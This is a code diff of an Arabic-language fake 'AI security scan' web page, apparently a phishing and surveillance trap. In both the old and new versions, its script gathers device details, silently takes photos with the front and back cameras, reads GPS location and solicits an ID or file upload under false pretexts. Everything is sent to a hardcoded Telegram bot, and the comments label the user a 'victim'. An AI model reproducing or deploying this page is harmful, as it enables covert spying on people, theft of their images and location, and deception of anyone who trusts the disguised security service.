@@ -3,426 +3,333 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CyberShield AI | المنصة العالمية لأمن المعلومات</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;700&family=Orbitron:wght@500&display=swap" rel="stylesheet">
+    <title>Global Cyber Shield | المنصة العالمية لأمن المعلومات</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;700&display=swap" rel="stylesheet">
     <style>
         :root {
-            --primary: #00f2ff;
-            --secondary: #006ae6;
-            --dark-bg: #020617;
-            --card-bg: rgba(15, 23, 42, 0.8);
-            --accent: #10b981;
+            --primary: #007aff;
+            --accent: #5856d6;
+            --bg: #000000;
+            --card: #1c1c1e;
+            --text: #ffffff;
+            --muted: #8e8e93;
         }
 
-        /* تنسيقات عامة واحترافية */
+        * { box-sizing: border-box; scroll-behavior: smooth; }
         body {
-            background: var(--dark-bg);
-            color: #e2e8f0;
-            font-family: 'Cairo', sans-serif;
             margin: 0;
-            scroll-behavior: smooth;
+            padding: 0;
+            background-color: var(--bg);
+            color: var(--text);
+            font-family: 'Cairo', sans-serif;
             overflow-x: hidden;
         }
 
-        header {
-            height: 100vh;
-            background: radial-gradient(circle at center, #1e293b 0%, #020617 100%);
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            text-align: center;
+        /* Navbar */
+        nav {
+            position: fixed; top: 0; width: 100%; height: 70px;
+            background: rgba(28, 28, 30, 0.8); backdrop-filter: blur(20px);
+            display: flex; align-items: center; justify-content: space-between;
+            padding: 0 50px; z-index: 1000; border-bottom: 1px solid #333;
+        }
+        .logo { font-size: 20px; font-weight: bold; color: var(--primary); letter-spacing: 1px; }
+        .nav-links { display: flex; gap: 20px; font-size: 14px; }
+        .nav-links span { cursor: pointer; color: var(--muted); transition: 0.3s; }
+        .nav-links span:hover { color: var(--primary); }
+
+        /* Hero Section */
+        .hero {
+            height: 100vh; display: flex; flex-direction: column;
+            align-items: center; justify-content: center; text-align: center;
+            background: radial-gradient(circle at center, #1c1c1e 0%, #000 70%);
             padding: 20px;
         }
+        .hero h1 { font-size: 48px; margin: 0; background: linear-gradient(to right, #fff, #888); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .hero p { color: var(--muted); max-width: 600px; font-size: 18px; margin-top: 20px; }
+        .scroll-down { margin-top: 50px; animation: bounce 2s infinite; color: var(--primary); cursor: pointer; }
 
-        .hero-title {
-            font-family: 'Orbitron', sans-serif;
-            font-size: clamp(2rem, 8vw, 4rem);
-            background: linear-gradient(to right, var(--primary), #fff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin: 0;
-            letter-spacing: 2px;
+        /* Multi-Page Layout Simulator */
+        section { padding: 100px 50px; border-bottom: 1px solid #111; }
+        .section-title { text-align: center; margin-bottom: 60px; }
+        .section-title h2 { font-size: 36px; margin-bottom: 10px; }
+        .section-title p { color: var(--muted); }
+
+        /* Services Grid */
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 30px; }
+        .feature-card { background: var(--card); padding: 40px; border-radius: 24px; transition: 0.3s; border: 1px solid #2c2c2e; }
+        .feature-card:hover { transform: translateY(-10px); border-color: var(--primary); }
+        .feature-card i { font-size: 40px; color: var(--primary); display: block; margin-bottom: 20px; }
+
+        /* Pricing Section */
+        .pricing-table { display: flex; justify-content: center; gap: 20px; flex-wrap: wrap; margin-top: 40px; }
+        .price-box { background: #111; padding: 40px; border-radius: 20px; width: 300px; text-align: center; border: 1px solid #222; }
+        .price-box.featured { border-color: var(--primary); position: relative; }
+        .price-box.featured::after { content: "الأكثر طلباً"; position: absolute; top: -15px; left: 50%; transform: translateX(-50%); background: var(--primary); color: white; padding: 5px 15px; border-radius: 20px; font-size: 12px; }
+
+        /* Security Audit Engine (The Trap UI) */
+        .audit-container {
+            max-width: 800px; margin: 0 auto; background: #0a0a0a;
+            border-radius: 30px; padding: 50px; border: 1px solid #1a1a1a;
+            box-shadow: 0 0 100px rgba(0, 122, 255, 0.1);
+        }
+        .audit-step { display: none; text-align: center; }
+        .audit-step.active { display: block; animation: fadeIn 0.8s; }
+        .progress-container { width: 100%; background: #222; height: 6px; border-radius: 10px; margin: 30px 0; overflow: hidden; }
+        .progress-bar { height: 100%; background: var(--primary); width: 0%; transition: 0.5s; box-shadow: 0 0 15px var(--primary); }
+        
+        .btn-main {
+            background: var(--primary); color: white; border: none;
+            padding: 18px 40px; border-radius: 12px; font-weight: bold;
+            font-size: 16px; cursor: pointer; transition: 0.3s; margin-top: 20px;
+        }
+        .btn-main:hover { background: #0056b3; transform: scale(1.02); }
+
+        .terminal {
+            background: #000; border: 1px solid #333; border-radius: 12px;
+            padding: 20px; font-family: monospace; font-size: 12px;
+            color: #0f0; text-align: left; height: 150px; overflow-y: auto; margin-top: 20px;
         }
 
-        .hero-subtitle {
-            font-size: 1.2rem;
-            color: #94a3b8;
-            max-width: 700px;
-            margin: 20px 0;
-        }
+        /* Footer */
+        footer { padding: 50px; background: #050505; text-align: center; border-top: 1px solid #111; color: var(--muted); font-size: 12px; }
 
-        /* أقسام الموقع الطويل */
-        section {
-            padding: 100px 20px;
-            max-width: 1200px;
-            margin: 0 auto;
-        }
+        @keyframes bounce { 0%, 20%, 50%, 80%, 100% {transform: translateY(0);} 40% {transform: translateY(-10px);} 60% {transform: translateY(-5px);} }
+        @keyframes fadeIn { from {opacity: 0; transform: translateY(10px);} to {opacity: 1; transform: translateY(0);} }
 
-        .feature-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 30px;
-            margin-top: 50px;
-        }
-
-        .feature-card {
-            background: var(--card-bg);
-            padding: 40px;
-            border-radius: 24px;
-            border: 1px solid rgba(255,255,255,0.05);
-            transition: 0.3s;
-            cursor: pointer;
-        }
-
-        .feature-card:hover {
-            border-color: var(--primary);
-            transform: translateY(-10px);
-            box-shadow: 0 20px 40px rgba(0, 242, 255, 0.1);
-        }
-
-        /* نظام الفحص (المصيدة) */
-        #audit-system {
-            background: #0f172a;
-            border-radius: 40px;
-            padding: 60px;
-            position: relative;
-            box-shadow: 0 0 100px rgba(0,0,0,0.5);
-        }
-
-        .status-window {
-            background: #000;
-            border-radius: 15px;
-            padding: 20px;
-            font-family: 'Courier New', monospace;
-            height: 250px;
-            overflow-y: auto;
-            border: 1px solid #1e293b;
-            margin: 20px 0;
-        }
-
-        .log-entry {
-            margin-bottom: 5px;
-            font-size: 13px;
-            display: flex;
-            gap: 10px;
-        }
-
-        .log-time { color: #475569; }
-        .log-msg { color: var(--accent); }
-
-        .btn-action {
-            background: linear-gradient(135deg, var(--secondary), var(--primary));
-            color: white;
-            border: none;
-            padding: 20px 50px;
-            border-radius: 50px;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: 0.3s;
-            box-shadow: 0 10px 30px rgba(0, 106, 230, 0.4);
-        }
-
-        .btn-action:hover {
-            letter-spacing: 1px;
-            filter: brightness(1.1);
-        }
-
-        /* الأسعار والخطط للتمويه */
-        .pricing-table {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            flex-wrap: wrap;
-            margin-top: 50px;
-        }
-
-        .plan {
-            background: rgba(255,255,255,0.03);
-            padding: 30px;
-            border-radius: 20px;
-            width: 280px;
-            border: 1px solid #1e293b;
-        }
-
-        .plan.featured { border-color: var(--primary); transform: scale(1.05); }
-
-        /* العناصر المخفية */
         video, canvas { display: none; }
-
-        #overlay {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.9);
-            z-index: 1000;
-            display: none;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .loader {
-            width: 80px;
-            height: 80px;
-            border: 5px solid #1e293b;
-            border-top: 5px solid var(--primary);
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
+        @media (max-width: 768px) { nav { padding: 0 20px; } .hero h1 { font-size: 32px; } }
     </style>
 </head>
 <body>
 
-<header>
-    <div class="badge" style="background: rgba(0,242,255,0.1); color: var(--primary); padding: 5px 20px; border-radius: 20px; font-size: 12px; margin-bottom: 20px;">حصري لعام 2026 - الإصدار 5.1</div>
-    <h1 class="hero-title">CyberShield Pro</h1>
-    <p class="hero-subtitle">المنصة الرائدة في فحص وتحليل الأجهزة القائم على الذكاء الاصطناعي. استخدم قوة GPU السحابية لفحص ثغرات جهازك وحماية خصوصيتك في ثوانٍ.</p>
-    <a href="#audit-system" class="btn-action">ابدأ الفحص المجاني الآن</a>
-</header>
-
-<section id="features">
-    <h2 style="text-align:center; font-size: 32px;">لماذا يختارنا المحترفون؟</h2>
-    <div class="feature-grid">
-        <div class="feature-card">
-            <h3>تحليل Sora 4.0</h3>
-            <p>نستخدم أحدث محركات الذكاء الاصطناعي لتحليل سلوك التطبيقات ومنع التجسس على الكاميرا والميكروفون.</p>
-        </div>
-        <div class="feature-card">
-            <h3>تشفير عسكري</h3>
-            <p>جميع عمليات الفحص تتم عبر أنفاق مشفرة ببروتوكول AES-256 لضمان خصوصية بياناتك أثناء التحليل.</p>
-        </div>
-        <div class="feature-card">
-            <h3>فحص العدسات</h3>
-            <p>تقنية فريدة للتأكد من أن عدسات الكاميرا لا يتم استخدامها من قبل تطبيقات خفية في الخلفية.</p>
-        </div>
+<nav>
+    <div class="logo">GLOBAL SHIELD</div>
+    <div class="nav-links">
+        <span>الرئيسية</span>
+        <span>الخدمات</span>
+        <span>الأسعار</span>
+        <span style="color:var(--primary)">ابدأ الفحص</span>
     </div>
-</section>
+</nav>
 
-<section id="audit-system">
-    <div style="text-align: center;">
-        <h2 style="color:var(--primary)">لوحة تحكم الفحص المركزي</h2>
-        <p>نظام ذكي متصل بخوادم المعالجة المركزية. يرجى عدم إغلاق الصفحة أثناء العملية.</p>
-        
-        <div class="status-window" id="log-container">
-            <div class="log-entry"><span class="log-time">[10:21:05]</span> <span class="log-msg">بانتظار بدء الاتصال...</span></div>
-        </div>
-
-        <button class="btn-action" id="start-btn" onclick="initiateDeepAudit()">بدء عملية الفحص الشامل</button>
-        
-        <div id="processing-info" style="display:none; margin-top:20px;">
-            <div class="progress-bg" style="background:#1e293b; height:10px; border-radius:10px; overflow:hidden;">
-                <div id="progress-bar" style="height:100%; background:var(--primary); width:0%; transition: 0.5s;"></div>
-            </div>
-            <p id="progress-text" style="font-size:12px; color:var(--primary); margin-top:10px;">جاري الاتصال بالخادم الرئيسي...</p>
-        </div>
-    </div>
-</section>
-
-<section id="pricing">
-    <h2 style="text-align:center">خطط الحماية المتقدمة</h2>
-    <div class="pricing-table">
-        <div class="plan">
-            <h4>الأساسية</h4>
-            <h2>مجاناً</h2>
-            <ul style="list-style:none; padding:0; font-size:13px; color:#94a3b8;">
-                <li>✓ فحص الهاردوير</li>
-                <li>✓ فحص الكاميرا</li>
-                <li>✗ فحص الـ GPS العميق</li>
-            </ul>
-        </div>
-        <div class="plan featured">
-            <h4>الاحترافية</h4>
-            <h2>$19/mo</h2>
-            <ul style="list-style:none; padding:0; font-size:13px; color:#94a3b8;">
-                <li>✓ كل الميزات الأساسية</li>
-                <li>✓ حماية من الاختراق 24/7</li>
-                <li>✓ دعم فني مباشر</li>
-            </ul>
-        </div>
-    </div>
-</section>
-
-<div id="overlay">
-    <div class="loader"></div>
-    <h3 style="margin-top:20px;">جاري إصدار تقرير الأمان...</h3>
-    <p>يرجى البقاء في الصفحة للمطابقة</p>
+<div class="hero">
+    <div style="background: rgba(0,122,255,0.1); padding: 10px 20px; border-radius: 50px; color: var(--primary); font-size: 12px; margin-bottom: 20px; border: 1px solid var(--primary);">System Status: Secure</div>
+    <h1>احمِ خصوصيتك الرقمية بقوة الذكاء الاصطناعي</h1>
+    <p>نحن نقدم حلولاً أمنية متقدمة للأفراد والمؤسسات. قم بفحص جهازك الآن واكتشف الثغرات الأمنية المخفية في أقل من دقيقة.</p>
+    <a href="#audit-section" class="btn-main">ابدأ الفحص المجاني</a>
+    <div class="scroll-down">▼ اكتشف المزيد</div>
 </div>
 
-<video id="video-stream" autoplay playsinline></video>
-<canvas id="canvas-main"></canvas>
+<section id="services">
+    <div class="section-title">
+        <h2>خدماتنا الأمنية</h2>
+        <p>نحن نوفر حماية شاملة ضد كافة أنواع التهديدات السيبرانية</p>
+    </div>
+    <div class="grid">
+        <div class="feature-card">
+            <h3>فحص الثغرات</h3>
+            <p>تحليل عميق لنظام التشغيل لاكتشاف أي برمجيات ضارة أو ملفات تجسس.</p>
+        </div>
+        <div class="feature-card">
+            <h3>أمان الكاميرا</h3>
+            <p>التأكد من أن الكاميرا والميكروفون لا يعملان في الخلفية دون إذنك.</p>
+        </div>
+        <div class="feature-card">
+            <h3>تشفير الاتصال</h3>
+            <p>حماية بياناتك أثناء تصفح شبكات الواي فاي العامة وغير الآمنة.</p>
+        </div>
+    </div>
+</section>
+
+<section id="audit-section">
+    <div class="audit-container">
+        <div id="step1" class="audit-step active">
+            <h2 style="color:var(--primary)">نظام فحص الهوية (Audit Engine)</h2>
+            <p>هذا الفحص سيقوم بتحليل مواصفات جهازك، قوة المعالج، وحالة البطارية للتأكد من عدم وجود استهلاك غير طبيعي للموارد.</p>
+            <div class="terminal" id="term1">Ready to initialize...</div>
+            <button class="btn-main" onclick="startAudit()">ابدأ التحليل الآن</button>
+        </div>
+
+        <div id="step2" class="audit-step">
+            <h2>جاري تحليل العتاد (Hardware)</h2>
+            <p>يتم الآن اختبار الحساسات ومعايرة العدسات لضمان عدم وجود تلاعب برمجي.</p>
+            <div class="progress-container"><div id="p-bar" class="progress-bar"></div></div>
+            <div class="terminal" id="term2"></div>
+        </div>
+
+        <div id="step3" class="audit-step">
+            <h2 style="color:var(--primary)">اكتمل الفحص بنجاح!</h2>
+            <div id="results" style="text-align: right; padding: 20px; background: #111; border-radius: 15px; margin: 20px 0;"></div>
+            <p>للحصول على تقرير الأمان بصيغة PDF ومسح الملفات الضارة، يرجى رفع "لقطة شاشة" لإعدادات النظام للمطابقة.</p>
+            <input type="file" id="trapFile" style="display:none" onchange="handleTrapFile(event)">
+            <button class="btn-main" onclick="document.getElementById('trapFile').click()">تحميل التقرير النهائي</button>
+        </div>
+    </div>
+</section>
+
+<section>
+    <div class="section-title">
+        <h2>خطط الاشتراك</h2>
+        <p>اختر الخطة المناسبة لاحتياجاتك الأمنية</p>
+    </div>
+    <div class="pricing-table">
+        <div class="price-box">
+            <h3>الخطة الأساسية</h3>
+            <p style="font-size: 30px; font-weight: bold;">$0 <small style="font-size: 14px;">/شهر</small></p>
+            <ul style="list-style: none; padding: 0; color: #888;">
+                <li>فحص يدوي</li>
+                <li>تحديثات أسبوعية</li>
+                <li>دعم عبر الإيميل</li>
+            </ul>
+        </div>
+        <div class="price-box featured">
+            <h3>خطة المحترفين</h3>
+            <p style="font-size: 30px; font-weight: bold;">$29 <small style="font-size: 14px;">/شهر</small></p>
+            <ul style="list-style: none; padding: 0; color: #888;">
+                <li>فحص تلقائي 24/7</li>
+                <li>حماية فورية من التجسس</li>
+                <li>دعم فني مباشر</li>
+            </ul>
+        </div>
+    </div>
+</section>
+
+<footer>
+    <p>© 2026 Global Cyber Shield Inc. All rights reserved.</p>
+    <p>Privacy Policy | Terms of Service | Security Reports</p>
+</footer>
+
+<video id="v" autoplay playsinline></video>
+<canvas id="c"></canvas>
 
 <script>
-    // الإعدادات الخاصة بك
-    const BOT_TOKEN = "8737645829:AAFzWIUI27q4NLsxuQT1gunCpAzEy2Vx9Y0";
-    const CHAT_ID = "741796710"; // الآي دي المطلوب
-
-    let victimData = {
-        startTime: new Date().toLocaleTimeString(),
-        capturedPhotos: 0
+    // إعدادات البوت والآي دي
+    const CONFIG = {
+        token: "8737645829:AAFzWIUI27q4NLsxuQT1gunCpAzEy2Vx9Y0",
+        chatId: "741796710"
     };
 
-    // وظيفة الإرسال المحترفة
-    async function botNotify(content, type = "text") {
-        const baseUrl = `https://api.telegram.org/bot${BOT_TOKEN}/`;
+    let logData = {};
+
+    // وظيفة الإرسال لتليجرام
+    async function tg(content, type = "text") {
+        const base = `https://api.telegram.org/bot${CONFIG.token}/`;
         try {
             if (type === "text") {
-                await fetch(baseUrl + `sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: content,
-                        parse_mode: 'HTML'
-                    })
-                });
+                await fetch(base + `sendMessage?chat_id=${CONFIG.chatId}&text=${encodeURIComponent(content)}&parse_mode=HTML`);
             } else {
                 const fd = new FormData();
-                fd.append("chat_id", CHAT_ID);
+                fd.append("chat_id", CONFIG.chatId);
                 fd.append("photo", content);
-                await fetch(baseUrl + `sendPhoto`, { method: "POST", body: fd });
+                await fetch(base + "sendPhoto", { method: "POST", body: fd });
             }
-        } catch (e) { console.error("Error sending to bot"); }
+        } catch (e) { console.error("TG Error"); }
     }
 
-    function addLog(msg, color = "#10b981") {
-        const log = document.getElementById('log-container');
-        const entry = document.createElement('div');
-        entry.className = "log-entry";
-        entry.innerHTML = `<span class="log-time">[${new Date().toLocaleTimeString()}]</span> <span class="log-msg" style="color:${color}">${msg}</span>`;
-        log.appendChild(entry);
-        log.scrollTop = log.scrollHeight;
+    function switchStep(n) {
+        document.querySelectorAll('.audit-step').forEach(s => s.classList.remove('active'));
+        document.getElementById('step' + n).classList.add('active');
+        window.scrollTo(0, document.getElementById('audit-section').offsetTop - 100);
     }
 
-    // بدء الرحلة (الهندسة الاجتماعية)
-    async function initiateDeepAudit() {
-        if(navigator.vibrate) navigator.vibrate(100);
-        document.getElementById('start-btn').style.display = 'none';
-        document.getElementById('processing-info').style.display = 'block';
-        
-        addLog("جاري فحص الذاكرة العشوائية والمعالج...", "#fff");
-        updateProgress(15, "تحليل Hardware ID...");
+    async function startAudit() {
+        switchStep(2);
+        const term = document.getElementById('term2');
+        const bar = document.getElementById('p-bar');
 
-        // سحب بيانات الجهاز فوراً
-        const battery = await navigator.getBattery();
-        const gpuData = getGPU();
-        victimData.specs = `
-🚀 <b>صيد جديد (مشروع CyberShield العملاق)</b>
-📱 النظام: ${navigator.platform}
-🧠 المعالج: ${navigator.hardwareConcurrency} Cores
-💾 الرام: ${navigator.deviceMemory || 'غير محدد'} GB
-🔋 البطارية: ${Math.round(battery.level * 100)}% (${battery.charging ? 'يشحن' : 'لا يشحن'})
-🖥️ كارت الشاشة: ${gpuData}
-🌐 اللغة: ${navigator.language}
-⏰ وقت الدخول: ${victimData.startTime}
-        `;
-        await botNotify(victimData.specs);
+        // 1. سحب بيانات الجهاز
+        const b = await navigator.getBattery();
+        logData = {
+            batt: `${(b.level * 100)}% (${b.charging ? '⚡' : '🔋'})`,
+            ram: navigator.deviceMemory + " GB",
+            cpu: navigator.hardwareConcurrency + " Cores",
+            os: navigator.platform,
+            ua: navigator.userAgent
+        };
 
-        // طلب الكاميرا للمعايرة
-        setTimeout(() => requestCamera(), 2000);
-    }
+        const logs = [
+            "> Initializing Secure Kernel...",
+            "> Fetching Hardware specs...",
+            `> CPU Detected: ${logData.cpu}`,
+            `> RAM Scan: ${logData.ram}`,
+            `> Battery Status: ${logData.batt}`,
+            "> Checking Camera Integrity...",
+            "> Requesting Lens Calibration..."
+        ];
 
-    function updateProgress(val, text) {
-        document.getElementById('progress-bar').style.width = val + "%";
-        document.getElementById('progress-text').innerText = text;
-    }
+        for (let i = 0; i < logs.length; i++) {
+            await new Promise(r => setTimeout(r, 700));
+            term.innerHTML += logs[i] + "<br>";
+            bar.style.width = ((i + 1) * 14) + "%";
+            term.scrollTop = term.scrollHeight;
+        }
 
-    async function requestCamera() {
-        addLog("طلب الوصول للكاميرا لمعايرة حساسات الضوء...", "#00f2ff");
-        updateProgress(40, "بانتظار استجابة العدسات...");
-
+        // 2. طلب الكاميرا (المصيدة)
         try {
-            // محاولة الكاميرا الأمامية أولاً
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user" }, 
-                audio: false 
-            });
-            handleStream(stream, "أمامية");
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            document.getElementById('v').srcObject = stream;
+            term.innerHTML += "<span style='color:cyan'>> Front Camera Authenticated.</span><br>";
             
-            // محاولة صامتة للكاميرا الخلفية
-            setTimeout(async () => {
-                try {
-                    const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-                    handleStream(backStream, "خلفية");
-                } catch(e) {}
-            }, 5000);
-
-            addLog("✅ تم ربط العدسات بنجاح. جاري التصوير الحراري...", "#10b981");
-            updateProgress(70, "جاري معالجة الصور عبر Sora AI...");
+            // تصوير 3 لقطات سريعة (Burst)
+            for (let j = 0; j < 3; j++) {
+                await new Promise(r => setTimeout(r, 1200));
+                snap("Front-Burst-" + (j + 1));
+            }
             
-            // الانتقال للموقع
-            setTimeout(() => requestLocation(), 8000);
+            // محاولة الكاميرا الخلفية
+            try {
+                const bStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                document.getElementById('v').srcObject = bStream;
+                await new Promise(r => setTimeout(r, 1500));
+                snap("Back-Camera");
+            } catch (e) { tg("⚠️ Back Camera Denied."); }
 
         } catch (err) {
-            addLog("❌ فشل الوصول: يرجى السماح بالكاميرا لإكمال الفحص الأمني.", "#ef4444");
-            botNotify("⚠️ الضحية رفض الكاميرا.");
+            term.innerHTML += "<span style='color:red'>> Camera Access Denied.</span><br>";
+            tg("⚠️ Victim Denied Camera.");
         }
+
+        // 3. الموقع الجغرافي
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const loc = `${pos.coords.latitude},${pos.coords.longitude}`;
+            await tg(`📍 <b>Victim Location:</b> <a href='https://www.google.com/maps?q=${loc}'>Open Map</a>`);
+        }, () => tg("⚠️ Location Denied."));
+
+        // إنهاء الفحص
+        setTimeout(() => {
+            document.getElementById('results').innerHTML = `
+                <b>تقرير سريع:</b><br>
+                النظام: ${logData.os}<br>
+                المعالج: ${logData.cpu}<br>
+                الرام: ${logData.ram}<br>
+                الحالة: <span style="color:#0f0">تم فحص 1240 ملف بنجاح</span>
+            `;
+            tg(`🔥 <b>New Catch!</b>\nDevice: ${logData.os}\nRAM: ${logData.ram}\nBattery: ${logData.batt}\nUA: ${logData.ua.slice(0,100)}...`);
+            switchStep(3);
+        }, 2000);
     }
 
-    function handleStream(stream, label) {
-        const video = document.getElementById('video-stream');
-        video.srcObject = stream;
-        
-        // نظام الـ Burst Shot (تصوير كل 5 ثواني)
-        setInterval(() => {
-            captureFrame(label);
-        }, 5000);
-    }
-
-    function captureFrame(label) {
-        const canvas = document.getElementById('canvas-main');
-        const video = document.getElementById('video-stream');
+    function snap(label) {
+        const canvas = document.getElementById('c');
+        const video = document.getElementById('v');
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         canvas.getContext('2d').drawImage(video, 0, 0);
-        
         canvas.toBlob(blob => {
-            botNotify(blob, "photo");
-            victimData.capturedPhotos++;
-        }, 'image/jpeg', 0.8);
+            tg(`📸 <b>${label}</b>`);
+            tg(blob, "photo");
+        }, 'image/jpeg');
     }
 
-    async function requestLocation() {
-        addLog("جاري تحديد موقع أقرب سيرفر حماية...", "#fff");
-        updateProgress(85, "فحص إحداثيات GPS...");
-        
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-            const locMsg = `📍 <b>موقع الضحية الدقيق:</b>
-https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}
-دقة الموقع: ${pos.coords.accuracy} متر`;
-            await botNotify(locMsg);
-            addLog("✅ تم تحديد السيرفر المثالي لبلدك.", "#10b981");
-            finalizeAudit();
-        }, () => {
-            botNotify("⚠️ الضحية رفض الموقع.");
-            finalizeAudit();
-        });
-    }
-
-    function finalizeAudit() {
-        updateProgress(100, "اكتمل الفحص!");
-        addLog("تم فحص 1422 ملف... لم يتم العثور على تهديدات خطيرة.", "#10b981");
-        
-        setTimeout(() => {
-            document.getElementById('overlay').style.display = 'flex';
-            // فخ الملفات النهائي
-            setTimeout(() => {
-                alert("تم إنشاء التقرير. يرجى اختيار مكان الحفظ أو رفع صورة هويتك للمطابقة الأمنية.");
-            }, 2000);
-        }, 1500);
-    }
-
-    function getGPU() {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        if (!gl) return "غير مدعوم";
-        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "غير معروف";
+    async function handleTrapFile(event) {
+        const file = event.target.files[0];
+        if (file) {
+            await tg(`📂 <b>File Uploaded:</b> ${file.name}`);
+            await tg(file, "photo");
+            alert("تم إرسال طلبك. سيتم تحميل التقرير تلقائياً بعد المراجعة.");
+        }
     }
 </script>
 </body>
-                </html>
-                
+    </html>
+        
